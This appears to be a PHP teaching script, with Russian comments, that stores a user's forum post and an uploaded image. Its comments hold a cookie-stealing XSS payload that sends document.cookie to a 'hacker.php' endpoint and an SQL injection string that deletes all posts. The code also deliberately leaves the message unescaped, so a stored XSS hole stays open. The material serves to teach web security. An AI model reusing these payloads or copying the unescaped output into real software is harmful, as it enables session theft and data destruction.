<?php
require_once "init.php";

if (!isUserAuthorized()) {
    header('Location: registerForm.php');
    die;
}

$db = getDbConnection();

/*
JS имеет доступ к пользовательским данным в браузере. К примеру команда в консоли: document.cookie покажет куки
пользователя. Вот такое сообщение украдет куки (код создаёт объект картинки, которая при загрузке страницы
отправляет запрос на наш файл hacker.php и в гет-параметре передаёт куки.
<script>
i = new Image(); i.src = "hacker.php/?" + document.cookie;
</script>
такой код выполнится у всех пользователей, зашедших на страницу и их куки улетят нам в файлик
 */

//$message = htmlspecialchars($_POST['message']); // безопасно - Преобразует специальные символы в HTML-сущности
$message = $_POST['message']; // не безопасно
$userId = $_SESSION['user_id'];
$date = date('Y-m-d H:i:s');

// такой код удалит все посты
// rand message', '2012-01-01'); DELETE FROM posts;

$query = "
        INSERT INTO posts 
          (
              user_id, 
              message, 
              `datetime`
          ) 
          VALUES 
          (
            $userId,
            :placeholder,
            '$date'
          );";

// не безопасно
// $ret = $db->query($query);

// безопасно
$prepared = $db->prepare($query);
$ret = $prepared->execute(['placeholder' => $message]);

$postId = $db->lastInsertId();

/*$_FILES['userfile']['tmp_name'] - путь к локальному временному файлу в ОС во время загрузки файлов.*/
if (!empty($_FILES['userfile']['tmp_name'])) {
//    получаем данные этого файла
    $fileContent = file_get_contents($_FILES['userfile']['tmp_name']);
    /*записываем в папку на уровень выше, чтобы не было доступа у кулхацкеров*/
    file_put_contents('../images/'. $postId . '.png', $fileContent);
}


if (!$ret) {
    print_r($db->errorInfo());
    echo 'error';
    die;
}

header('Location: index.php');